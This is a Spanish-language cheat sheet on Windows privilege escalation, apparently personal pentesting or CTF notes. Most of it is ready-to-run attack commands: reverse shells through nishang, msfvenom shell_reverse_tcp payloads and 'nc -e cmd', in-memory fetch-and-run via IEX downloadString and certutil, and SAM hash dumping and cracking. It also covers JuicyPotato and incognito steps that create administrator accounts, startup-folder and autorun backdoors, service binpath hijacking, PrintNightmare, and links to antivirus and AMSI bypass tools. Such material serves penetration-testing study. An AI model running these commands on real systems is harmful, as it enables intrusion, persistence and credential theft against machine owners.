---
title: Windows Priviele Escalation
published: true
---

# Windows Privilege escalation
## Table of contents

- [Windows Privilege escalation](#windows-privilege-escalation)
  - [LECTURA DE PERMISOS EN WINDOWS](#lectura-de-permisos-en-windows)
  - [ACCESSCHK](#accesschk)
  - [comando sc (service control)](#comando-sc-service-control)
  - [Obtener una powershell](#obtener-una-powershell)
  - [Herramientas Automatizadas](#herramientas-automatizadas)
    - [PowerUp](#powerup)
    - [Watson](#watson)
    - [Sherlock (Deprecated)](#sherlock-deprecated)
    - [BeRoot](#beroot)
    - [Windows Exploit Suggester](#windows-exploit-suggester)
    - [Windows Enum y exploit](#windows-enum-y-exploit)
    - [SeatBelt](#seatbelt)
    - [PowerLess](#powerless)
    - [JAWS](#jaws)
    - [WinPEAS](#winpeas)
    - [Windows Exploit Suggester (Next Generation)](#windows-exploit-suggester-next-generation)
    - [PrivescCheck](#privesccheck)
    - [Print Nightmare](#print-nightmare)
  - [SHARP COLLECTION](#sharp-collection)
  - [BYPASS DE PROTECCIONES](#bypass-de-protecciones)
  - [Enumeracion del sistema](#enumeracion-del-sistema)
  - [Enumeracion de usuarios](#enumeracion-de-usuarios)
  - [Enumeracion de la red](#enumeracion-de-la-red)
  - [Buscando Contraseñas](#buscando-contraseas)
  - [SeImpersonatePrivilege](#seimpersonateprivilege)
    - [manera alternativa](#manera-alternativa)
  - [AlwaysInstallElevated](#alwaysinstallelevated)
  - [Startup Applications](#startup-applications)
  - [AUTORUN](#autorun)
  - [BINPATH](#binpath)
  - [Las patatas (Potatos)](#las-patatas-potatos)
  - [Runas](#runas)
  - [Modifiable Services](#modifiable-services)
  - [Unquoted Service Path](#unquoted-service-path)
  - [Tareas Programadas](#tareas-programadas)
  - [ROBAR HASH CON SERIOUS SAM](#robar-hash-con-serious-sam)


## LECTURA DE PERMISOS EN WINDOWS

Podemos hacer uso del comando **icacls** para ver los permisos tanto de archivos como de directorios:

```bash
icacls <archivo/directorio>
```

output:

```bash
:\Users\TCM\Desktop>icacls key.txt
icacls key.txt
key.txt NT AUTHORITY\SYSTEM:(I)(F)
        BUILTIN\Administrators:(I)(F)
        TCM-PC\TCM:(I)(F)

Successfully processed 1 files; Failed processing 0 files
```

Permisos de herencia:

-   `OI` – Herencia de objetos: se aplica a esta carpeta y archivos. No habrá herencia ni propagación a subcarpetas.
-   `CI` – Herencia de contenedor: se aplica a este directorio y subdirectorios.
-   `IO` – Heredar solamente: no se aplica al archivo o directorio actual.
-   `(OI)(CI)`– Se aplica a esta carpeta, subcarpetas y archivos.
-   `(OI)(CI)(IO)` – Se aplica solo a subcarpetas y archivos.
-   `(CI)(IO)` – Se aplica solo a las subcarpetas.
-   `(OI)(IO)` – Se aplica solo a los archivos.
-   `(I)` - Heredar. ACE heredado del contenedor principal.

Permisos de acceso:

-   `D`  —  delete access;
-   `F`  —  full access;
-   `N` —  no access;
-   `M`  —  modify access;
-   `RX`  —  read and execute access;
-   `R` —  read-only access;
-   `W`  —  write-only access.

asignacion de permisos:

```bash
icacls archivo /grant usuario:permisos


icacls key.txt /grant user:(F)
icacls mydemo /grant user02:(OI)(CI)(R)
```

denegacion de permisos:

podemos realizar a carpetas compartidas tambien

```bash
icacls \\<nombreDeEquipo-IP>\<recursoCompartido>\<carpeta>\<archivo> /deny user02:F

icacls \\win10vm2\c$\temp\testfile.txt /deny user02:F
```

## ACCESSCHK

Comprobar Permisos para un usuario sobre un servicio

```bash
accesschk.exe /accepteula -ucqv <usuario> <servicio>
```

Comprobar Permisos para un usuario sobre un registro

```bash
accesschk.exe /accepteula -ukqv <usuario> <registro>
```

Comprobar Permisos para un usuario sobre un directorio

```bash
accesschk.exe /accepteula -udq <usuario> <path>
```

Comprobar Permisos de escritura para un usuario sobre un directorio

```bash
accesschk.exe /accepteula -uwdq <usuario> <servicio>
```


## comando sc (service control)

Consultar el estado de un servicio (running o sttoped):

```bash
sc query <servicio>
```

listar servicio:

```bash
tasklist /svc

#filtrar por PID
tasklist /svc /FI "PID -eq <PID>"
```

iniciar o detener un servicio:

```bash
net start <servicio>
sc start <servicio>

net stop <servicio>
sc stop <servicio>
```

## Obtener una powershell

Para trabajar mas comodos, una vez que hayamos obtenido una conexion reversa a la maquina windows podemos entrablarnos una powershell que tiene mas funcionalidades:

Utilizaremos el script Invoke-PowershellTcp.ps1 de [nishang](https://github.com/samratashok/nishang) que esta ubicado dentro de la carpeta shells del repositorio:

Lo copiamos a una ruta donde lo vamos a renombrar para no hacer tanto lio.

```bash
cp /nishang/Shells/Invoke-PowershellTcp.ps1 /home/kali/maquina/exploits

mv Invoke-PowershellTcp.ps1 PS.ps1
```

Puedes pasar este archivo a la maquina windows, cargarlo en memoria e invocarlo. O puedes hacer estos 3 pasos de un solo golpe, eso es lo que haremos acontinuacion:

Vamos a editar el archivo PS.ps1 y vamos a llamarlo al final del archivo con el siguiente comando (esta es la linea que tenemos que agregar):

```bash
Invoke-PowerShellTcp -Reverse -IPAddress <IP Kali> -Port <Puerto netcat>
```

De modo que cuando se cargue el archivo se invoke directamente una reverse powershell a nuestra maquina, nos quedamos a la escucha en el puerto definido:

```bash
rlwrap nc -lvnp <Puerto netcat>
```

Compartimos el archivo desde nuestra maquina Kali con python:

```bash
python -m SimpleHTTPServer # python2

python3 -m http.server # python3
```

y ahora lo vamos a ejecutar en memoria desde la maquina windows y asi como al final del archivo PS.ps1 se esta invocando la reverse powershell se nos enviara ésta a la escucha en netcat:

```bash
start /b C:\Windows\SysNative\WindowsPowershell\v1.0\powershell IEX(New-Object Net.WebClient).downloadString('http://<IP kali>:8000/PS.ps1')
```

Con esto se nos establecera una conexion a la maquina windows medianet una powershell.

Es mejor llamar a powershell desde **C:\Windows\SysNative\WindowsPowershell\v1.0\powershell** ya que asi estamos en la misma arquitectura tanto del sistema operativo y del proceso, lo puede comprobar de la siguiente manera:

```bash
# ya desde la reverse powershell

[Environment]::Is64BitOperatingSystem   # True

[Environment]::Is64BitProcess   # True
```

Ambos deben ser o True o false para que coincidan con la arquitectura, esto para que al llamar a las herramientas automatizadas para elevar privilegios no tengamos falsos positivos.

## Herramientas Automatizadas

### PowerUp
[PowerUP](https://github.com/PowerShellMafia/PowerSploit)

Dentro de la carpeta privesc del repositorio.

```bash
powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
```

Otra forma:

```bash
nano PowerUp.ps1

# agrego la siguiente linea al final

invoke-allChecks

python -m SimpleHTTPServer

# desde la powershell de windows

IEX(New-Object Net.WebClient).downloadString('http://<IP kali>:8000/PowerUp.ps1')
```

A veces te da resultado de contraseñas de algun usuario en texto claro, puedes testear de la sigueinte manera:

Con impacket:

```bash
psexec.py <DOMINIO>/<USUARIO>:<PASSWORD>@<IP WINDOWS> cmd.exe

psexec.py WORDGROUP/administrator:HolaMundo\!@10.10.10.125 cmd.exe
```

Nota: Es necesario escapar los caracteres especiales de la contraseña.

### Watson

[Watson](https://github.com/rasta-mouse/Watson)

Binario ya compilados [aqui](https://github.com/Marshall-Hallenbeck/compiled_binaries)

```bash
C:\> Watson.exe
```

### Sherlock (Deprecated)

[Sherlock](https://github.com/rasta-mouse/Sherlock)

Es bueno conocerlo pero el mas actualizado es Watson del mismo autor (RastaMouse)

```bash
powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File Sherlock.ps1
```

### BeRoot

[BeRoot](https://github.com/AlessandroZ/BeRoot/tree/master/Windows/BeRoot/beroot)

### Windows Exploit Suggester

[Windows Exploit Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)

```bash
./windows-exploit-suggester.py --update

./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo systeminfo.txt
```

Donde systeminfo.txt es la salida del comando de windows systeminfo pegados a un archivo .txt.


### Windows Enum y exploit

[Windows Privesc check](https://github.com/pentestmonkey/windows-privesc-check)

[Recopilacion de exploits](https://github.com/abatchy17/WindowsExploits)

[WindowsEnum](https://github.com/absolomb/WindowsEnum)

### SeatBelt

[SeatBelt](https://github.com/GhostPack/Seatbelt)

```bash
Seatbelt.exe -group=all -full

Seatbelt.exe -group=system -outputfile="C:\Temp\system.txt"

Seatbelt.exe -group=remote -computername=dc.theshire.local -computername=192.168.230.209 -username=THESHIRE\sam -password="yum \"po-ta-toes\""
```

Binario ya compilados [aqui](https://github.com/Marshall-Hallenbeck/compiled_binaries)

### PowerLess

[PowerLess](https://github.com/M4ximuss/Powerless)

```bash
certutil.exe -urlcache -split -f "http://$IP/Powerless.bat" Powerless.bat
```

### JAWS

[JAWS](https://github.com/411Hall/JAWS)

```bash
powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1 -OutputFilename JAWS-Enum.txt

#CMD

CMD C:\temp> powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1

```

### WinPEAS

Por excelencia una herramienta muy buena.

[winPEAS](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe)

Los binarios .exe estan dentro del repositorio, solo basta llamarlos desde la powershell o cmd.

Aqui otras formas de jugar con la ejecucion:

```bash
#One liner to download and execute winPEASany from memory in a PS shell
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Obfuscated%20Releases/winPEASany.exe" -UseBasicParsing | Select-Object -ExpandProperty Content)); [winPEAS.Program]::Main("")

#Before cmd in 3 lines
$url = "https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/raw/master/winPEAS/winPEASexe/binaries/Release/winPEASany.exe"
$wp=[System.Reflection.Assembly]::Load([byte[]](Invoke-WebRequest "$url" -UseBasicParsing | Select-Object -ExpandProperty Content));
[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use

#Load from disk in memory and execute:
$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS.exe")));
[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use

#Load from disk in base64 and execute
##Generate winpeas in Base64:
[Convert]::ToBase64String([IO.File]::ReadAllBytes("D:\Users\user\winPEAS.exe")) | Out-File -Encoding ASCII D:\Users\user\winPEAS.txt
##Now upload the B64 string to the victim inside a file or copy it to the clipboard

 ##If you have uploaded the B64 as afile load it with:
$thecontent = Get-Content -Path D:\Users\victim\winPEAS.txt
 ##If you have copied the B64 to the clipboard do:
$thecontent = "aaaaaaaa..." #Where "aaa..." is the winpeas base64 string
##Finally, load binary in memory and execute
$wp = [System.Reflection.Assembly]::Load([Convert]::FromBase64String($thecontent))
[winPEAS.Program]::Main("") #Put inside the quotes the winpeas parameters you want to use

#Loading from file and executing a winpeas obfuscated version
##Load obfuscated version
$wp = [System.Reflection.Assembly]::Load([byte[]]([IO.File]::ReadAllBytes("D:\Users\victim\winPEAS-Obfuscated.exe")));
$wp.EntryPoint #Get the name of the ReflectedType, in obfuscated versions sometimes this is different from "winPEAS.Program"
[<ReflectedType_from_before>]::Main("") #Used the ReflectedType name to execute winpeas
```

Parametros:

```bash
winpeas.exe #run all checks (except for additional slower checks - LOLBAS and linpeas.sh in WSL) (noisy - CTFs)
winpeas.exe systeminfo userinfo #Only systeminfo and userinfo checks executed
winpeas.exe notcolor #Do not color the output
winpeas.exe domain #enumerate also domain information
winpeas.exe wait #wait for user input between tests
winpeas.exe debug #display additional debug information
winpeas.exe log #log output to out.txt instead of standard output
winpeas.exe -linpeas=http://127.0.0.1/linpeas.sh #Execute also additional linpeas check (runs linpeas.sh in default WSL distribution) with custom linpeas.sh URL (if not provided, the default URL is: https://raw.githubusercontent.com/carlospolop/privilege-escalation-awesome-scripts-suite/master/linPEAS/linpeas.sh)
winpeas.exe -lolbas  #Execute also additional LOLBAS search check
```

### Windows Exploit Suggester (Next Generation)

[WES](https://github.com/bitsadmin/wesng)

```bash
# First obtain systeminfo
systeminfo
systeminfo > systeminfo.txt
# Then feed it to wesng
python3 wes.py --update-wes
python3 wes.py --update
python3 wes.py systeminfo.txt

```

###  PrivescCheck

[PrivescChecks](https://github.com/itm4n/PrivescCheck)

```bash
C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"
C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended"
C:\Temp\>powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PrivescCheck_%COMPUTERNAME% -Format TXT,CSV,HTML"

```

Es posible exportar los resultados en ciertos formatos, revisar el repositorio.

### Print Nightmare

[Print Nightmare](https://github.com/gyaansastra/Print-Nightmare-LPE)

[https://vk9-sec.com/printnightmare-cve-2021-1675-remote-code-execution-in-windows-spooler-service/](https://vk9-sec.com/printnightmare-cve-2021-1675-remote-code-execution-in-windows-spooler-service/)

listar impresoras.

```bash
wmic printer list brief

Get-Printer | Format-Table

```

verificacion del servico de impresoras:

```bash
rpcdump.py @10.10.11.106 | grep MS-RPRN
```

```bash
Powershell.exe Get-Service Spooler
```

usar el printnightmare LPE:

```bash
IEX(New-Object Net.WebClient).downloadString('http://10.10.14.139:8000/CVE-2021-1675.ps1')
```

con esto cargaremos todo el script en memoria y lo podremos usar:

```bash
Invoke-Nightmare -DriverName "Xerox" -NewUser "john" -NewPassword "SuperSecure"
```

## SHARP COLLECTION

[Sharp Collection](https://github.com/Flangvik/SharpCollection)

[https://deephacking.tech/como-compilar-un-archivo-sln-windows/](https://deephacking.tech/como-compilar-un-archivo-sln-windows/)

[https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries](https://github.com/S3cur3Th1sSh1t/PowerSharpPack/tree/master/PowerSharpBinaries)

## BYPASS DE PROTECCIONES

[https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader)
[https://github.com/Genetic-Malware/Ebowla](https://github.com/Genetic-Malware/Ebowla)
[https://github.com/tokyoneon/Chimera](https://github.com/tokyoneon/Chimera)
[https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
[https://github.com/tokyoneon/CredPhish](https://github.com/tokyoneon/CredPhish)
[https://github.com/klezVirus/chameleon](https://github.com/klezVirus/chameleon)
[https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell)
[https://github.com/S3cur3Th1sSh1t/Get-System-Techniques](https://github.com/S3cur3Th1sSh1t/Get-System-Techniques)
[https://github.com/juliourena/SharpNoPSExec](https://github.com/juliourena/SharpNoPSExec)

[https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp](https://github.com/DamonMohammadbagher/eBook-BypassingAVsByCSharp)

[https://github.com/S3cur3Th1sSh1t/SharpRDP](https://github.com/S3cur3Th1sSh1t/SharpRDP)

## Enumeracion del sistema

```bash
systeminfo

systeminfo | findstr /B /C:"OS Name" /C:"OS Version"

[System.Environment]::OSVersion.Version #Current OS version
```

```bash
# parches y actualizaciones

wmic qfe

wmic qfe get Caption,Description,HotFixID,InstalledOn

Get-WmiObject -query 'select * from win32_quickfixengineering' | foreach {$_.hotfixid} #List all patches

Get-Hotfix -description "Security update" #List only "Security Update" patches
```

```bash
# Arquitectura (tambien en systeminfo)

wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%
```

```bash
# listar variables de entorno

set
Get-ChildItem Env: | ft Key,Value

```

```bash
# listar todos los drivers

wmic logicaldisk get caption || fsutil fsinfo drives
wmic logicaldisk get caption,description,providername
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root
```

antivirus:

```bash
Get-CinInstance -Namespace root/SecurityCenter2 -ClassName AntivirusProduct
```

powershell history:

```bash
ConsoleHost_history #Find the PATH where is saved

type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt

type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

cat (Get-PSReadlineOption).HistorySavePath

cat (Get-PSReadlineOption).HistorySavePath | sls passw
```

## Enumeracion de usuarios

```bash
whoami

echo %USERNAME% || whoami

$env:username
```

```bash
# ver privilegios y grupos

whoami /priv

whoami /groups
```

```bash
# listar usuarios

net user

whoami /all

Get-LocalUser | ft Name,Enabled,LastLogon

Get-ChildItem C:\Users -Force | select Name

```

```bash
# cuentas logueadas

net accounts
```

**ver permisos de un cierto usuario en una cierta carpeta recursivamente:**

```bash
accesschk.exe -r -s user C:\test

#RW C:\test\normal.txt
#RW C:\test\secure.txt
#R  c:test\directory
```

Obtener mas detalles de algun usuario, en este caso del adminisrtador:

```bash
net user administrator
net user admin
net user %USERNAME%

```

```bash
# listar grupos

net localgroup
Get-LocalGroup | ft Name

# ver informacion de un grupo 

net localgroup administrators
Get-LocalGroupMember Administrators | ft Name, PrincipalSource
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource

```

```bash
# obtener controladores de dominio

nltest /DCLIST:DomainName
nltest /DCNAME:DomainName
nltest /DSGETDC:DomainName
```

## Enumeracion de la red

Listar todas las interfaces de red y DNS:

```bash
ipconfig /all
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address
Get-DnsClientServerAddress -AddressFamily IPv4 | ft
```

listar la actual tabla de enrutamiento:

```bash
route print
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex
```

Listar la tabla ARP:

```bash
arp -A
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State
```

Ver las conexiones actuales:

```bash
netstat -ano
```

Ver todos los recursos compartidos:

```bash
net share
powershell Find-DomainShare -ComputerDomain domain.local
```

Ver la configuracion SNMP:

```bash
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

## Buscando Contraseñas

El administrador de cuentas de seguridad (SAM), a menudo administrador de cuentas de seguridad, es un archivo de base de datos. Las contraseñas de usuario se almacenan en formato hash en una colmena de registro, ya sea como hash LM o como hash NTLM. Este archivo se puede encontrar en %SystemRoot%/system32/config/SAM y está montado en HKLM/SAM.

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

genere un archivo hash para john con pwdump o samdump

```bash
pwdump SYSTEM SAM > /root/sam.txt
samdump2 SYSTEM SAM -o sam.txt
```

Luego crackealo:

```bash
john -format=NT /root/sam.txt
```

Buscar el contenido de archivos, en este caso buscar passwords:

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

Buscando archivos con un nombre de archivo determinado:

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

Passwords en archivos unattend.xml

ubicacion de estos archivos:

```bash
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml
```

Ver el contenido de estos archivos:

```bash
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

ejemplo:

```bash
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>

```

las credenciales estan almacenadas en base64 por lo que lo puede descifrar:

```bash
$ echo "U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo="  | base64 -d 

# SecretSecurePassword1234*

```

Se puede hacer en metasploit con el siguiente modulo **post/windows/gather/enum_unattend**.


## SeImpersonatePrivilege

```bash
whoami /priv

SeImpersonatePrivilege 	...	enabled
	SeDebugPrivilege    ... enabled
```

Podemos usar juicy potato:

[JuiciPotato](https://github.com/ohpe/juicy-potato/releases/tag/v0.1)

Buscamos el netcat ya compilado de 32 o 64 bits:

[Netcat Binary](https://github.com/int0x33/nc.exe?files=1)

kali:

```bash
impacket-smbserver smbFolder $(pwd)
```

```bash
nc -lvnp 443
```

windows:

```bash
\\<IP Kali>\smbFolder\juicy.exe -l 1337 -p C:\Windows\Syste32\cmd.exe -a "\\<IP Kali>\smbFolder\netcat.exe -e cmd <IP Kali> <Puerto netcat>" -t *
```


### manera alternativa

Podemos trasnferir el juicypotato.exe a la maquina windows:

kali:

```bash
python -m SimpleHTTPServer
```

windows:

```bash
certutil.exe -f -urlcache -split http://<IP Kali>:8000/juicy.exe JP.exe
```

Y podemos ejecutarlo para crear un usuario como administrador porque el juicypotato ejecuta comandos como administrador: 

```bash
#CREAMOS USUARIO
JP.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c net user chris chris123! /add" -t *

#LO CONVERTIMOS EN ADMINISTRADOR
JP.exe -l 1337 -p "C:\Windows\System32\cmd.exe" -a "/c net localgroup Administrators chris /add" -t *
```

La contraseña debe cumplir con las politicas de contraseñas de la maquina asi que podemos elegir una dificil.

Muchas veces tenemos que ejecutar esto varias veces porque a la primera no te da. (no siempre)

**NOTA**

con el parametro **-c** si no funciona los comandos anteriores tenemos que especificar el CLSID que es un identificador unico de la version del sistema operativo de la maquina victima. Aqui esta el enlace de los CLSID de las versiones de windows en los que se puede usar el juicypotato:

[CLSID](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md)

**INCOGNITO.EXE**

- [https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip ](https://labs.mwrinfosecurity.com/assets/BlogFiles/incognito2.zip )

```bash
unzip incognito2.zip
```

pasamos el **incognito.exe** a la maquina windows .

verificamos tokens para impersonalizar:

```bash
list_tokens -u
```

si en el resultado vemos **SeImpersonatePrivilege**, **SeDebugPrivilege** y el token **NT AUTHORITY\\SYSTEM** podemos crear un usuario como administrador:

```bash
#ejemplo output vulnerable
Delegation Tokens Available
============================================
alfred\bruce 
alfred\chris 
IIS APPPOOL\DefaultAppPool 
NT AUTHORITY\IUSR 
NT AUTHORITY\LOCAL SERVICE 
NT AUTHORITY\NETWORK SERVICE 
NT AUTHORITY\SYSTEM 

Impersonation Tokens Available
============================================
NT AUTHORITY\ANONYMOUS LOGON 

Administrative Privileges Available
============================================
SeAssignPrimaryTokenPrivilege
SeCreateTokenPrivilege
SeTcbPrivilege
SeTakeOwnershipPrivilege
SeBackupPrivilege
SeRestorePrivilege
SeDebugPrivilege
SeImpersonatePrivilege
SeRelabelPrivilege
SeLoadDriverPrivilege
```

crear un usuario administrador:

```bash
incognito.exe add_user chicolate chicolate123
incognito.exe add_localgroup_user Administrators chicolate
```

**WINDOWS 10**

- [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)

## AlwaysInstallElevated

Verificar si estos dos registros tienen el valor de 1:

```bash
$ reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
$ reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

$ Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
$ Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installer
```

Si es asi los usuarios con cualquier privilegio pueden instalar (ejecutar) archivos .msi como NT AUTHORITY.

Podemos crear un msi con msfvenom:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.16.25 LPORT=4545 -f msi > shell.msi
```

Y ejecutarlo de la siguiente manera:

```bash
msiexec /quiet /qn /i shell.msi 

msiexec -> permite la ejecucion de msi desde consola 
/quiet -> Suprime cualquier mensaje al usuario durante la instalación 
/qn -> instalaciion sin GUI (interfaz grafica) 
/i -> Instalación regular
```

Y nos colocamos a la escucha con netcat para recibir nuestra reverse shell:

```bash
nc -lvnp 4545
```

## Startup Applications

Primero debemos ver los permisos que el usuario con el que ingresamos en la carpeta **C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\Startup**:

```bash
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

otra forma es con **Accesschk.exe**:

```bash
Accesschk.exe -accepteula -wuqv "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

Necesitamos permisos para poder escribir en ese directorio, si tenemos **Full Access (F)** seria lo mejor. 

En caso de tener, es ahi donde se encuentran los binarios que se ejecutan al iniciar una sesion de windows, la idea es generar un binario con msfvenom en formato **exe**, pasarlo a la maquina windows y depositarlo en esta ruta. 

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP_KALI> LPORT=<PUERTO_KALI> -f exe > svchost.exe
```

lo pasamos:

KALI:

```bash
python -m SimpleHTTPServer
```

WINDOWS:

```bash
powershell.exe -c "(New-Object Net.WebClient).downloadFile('http://<IP_KALI>:8000/svchost.exe','C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\svchost.exe')"
```

ahora debemos ponernos a la escuhca, cerrar la sesion y volver a iniciar.

puedes hacerlo a traves de RDP.

[https://steflan-security.com/windows-privilege-escalation-startup-applications/](https://steflan-security.com/windows-privilege-escalation-startup-applications/)

## AUTORUN

Muy parecido a la forma de escalar privilegios mediante los startup application, existe un registro en windows donde se almacenan aquellas aplicaciones que se almacenan automaticamente al iniciar sesion, podemos consultar ese registro:

```bash
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```

imaginemos que si hay una aplicacion almacenada en este registro, tiene la siguiente ruta: **"C:\\Program Files\\Autorun\\program.exe"**. Debemos verificar si tenemos permisos de escritura en esa ruta:

```bash
icacls.exe "C:\Program Files\Autorun\program.exe"
```

o

```bash
accesschk.exe "C:\Program Files\Autorun\program.exe"
```

en caso de tener permisos podemos crearnos un backdoor con msfvenom y reemplazar el ejecutable por nuestro backdoor:

```bash
msfvenom -p windows/shell_reverse_tcp LHOST=<IP_KALI> LPORT=<PUERTO_KALI> -f exe > program.exe
```

lo pasamos:

KALI:

```bash
python -m SimpleHTTPServer
```

WINDOWS:

```bash
powershell.exe -c "(New-Object Net.WebClient).downloadFile('http://<IP_KALI>:8000/program.exe','C:\Program Files\Autorun\program.ex')"
```

ahora debemos ponernos a la escuhca, cerrar la sesion y volver a iniciar.

reiniciamos el equipo windows

```bash
shutdown /r /t 0
```

## BINPATH

debemos ver los permisos que se tiene en los servicios que se estan corriendo en el equipo, el permiso **SERVICE_CHANGE_CONFIG** nos permitiria cambiar la propiedad **binpath** del servicio para poder colocar un comando a ejecutar, asi poder obtener un RCE.

Podemos listar los nombres de los sericios:

```bash
wmic service list full | findstr /r "^Name="
```

ahora con **accesschk.exe** debemos comprobar los permisos en cada uno:

```bash
accesschk.exe /accepteula -ucqv <usuario> <servicio>
```

De esta forma vemos los permisos de un servicio para un usuario en particular, si vemos que algunos tiene ese permiso en nuestro usuario o para todos, entonces modificamos el atributodel servicio:

digamos que el servicio **daclsvc** tiene ese permiso para nuestro usuario:

```bash
sc config daclsvc binpath= "C:\Users\user\Desktop\nc.exe 10.1.10.1 4545 -e cmd.exe"
```

nos colocamos a la esucha en ese puerto y ahora reiniciamos el servicio:

```bash
sc stop daclsvc

sc startlsvc
```

al iniciar se nos abrira una consolaen nuestro KALI.

## Las patatas (Potatos)

Existen diferentes papatas para escalar privilegios:

-   [Hot Potato](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#hotPotato)
-   [Rotten Potato](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#rottenPotato)
-   [Lonely Potato](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#lonelyPotato)
-   [Juicy Potato](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#juicyPotato)
-   [Rogue Potato](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html#roguePotato)

Siga este consejo:

-   Si la máquina es >= Windows 10 1809 y Windows Server 2019 - Pruebe **Rogue Potato**
    
-   Si la máquina es < Windows 10 1809 < Windows Server 2019 - Pruebe **Juicy Potato**

[Rogue Potato Github](https://github.com/antonioCoco/RoguePotato)

PoC:

Maquina KALI

Ejecute en su máquina la redirección socat (reemplazar `VICTIM_IP`):

```bash
socat tcp-listen:135,reuseaddr,fork tcp:VICTIM_IP:9999
```

Ejecute PoC (reemplace `YOUR_IP`y `command`):

```bash
.\RoguePotato.exe -r YOUR_IP -e "command" -l 9999
```

Fuente: [Potatoes](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)

Existe una implementacion de Hot Potato para powershell [tater](https://github.com/Kevin-Robertson/Tater):

bypass del execution policy:

```bash
powershell.exe -nop -ep bypass
```

importar script:

```bash
Import-Module Tater.ps1
```

